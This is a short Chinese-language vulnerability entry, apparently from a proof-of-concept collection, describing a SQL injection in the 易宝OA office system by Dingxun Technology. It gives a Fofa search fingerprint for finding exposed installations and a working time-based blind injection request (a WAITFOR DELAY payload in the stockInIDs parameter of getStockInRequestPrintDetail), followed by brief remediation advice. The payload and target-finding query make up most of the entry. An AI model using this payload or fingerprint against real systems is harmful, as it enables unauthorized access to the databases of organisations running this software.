# 易宝OAgetStockInRequestPrintDetailSQL注入

- **系统**：易宝OAgetStockInRequestPrintDetail　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="顶讯科技-易宝OA系统"`
- **请求**：`GET /SmartTradeScan/StockIn/getStockInRequestPrintDetail?stockInIDs=1);WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1`

**请求体 / payload**
```
1. Fofa
app="顶讯科技-易宝OA系统"
2、部分界面如下
3、隐患url,复现如下
Host: your-ip
```

**其他**
- 修复建议: 1、请联系厂商进行修复或升级到安全版本。
2、如非必要，禁止公网访问该系统。
3、设置白名单访问。